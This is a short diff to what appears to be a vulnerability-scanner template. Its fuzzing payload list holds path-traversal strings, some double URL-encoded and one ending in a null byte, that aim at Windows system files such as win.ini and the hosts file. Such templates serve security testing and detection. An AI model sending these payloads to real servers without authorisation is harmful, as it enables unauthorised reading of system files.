@@ -13,7 +13,7 @@ http:
 
     payloads:
       win_fuzz:
-        - '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts'
+        - '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini'
         - '\WINDOWS\win.ini'
         - '\WINDOWS\win.ini'
         - '\WINDOWS\win.ini%00'
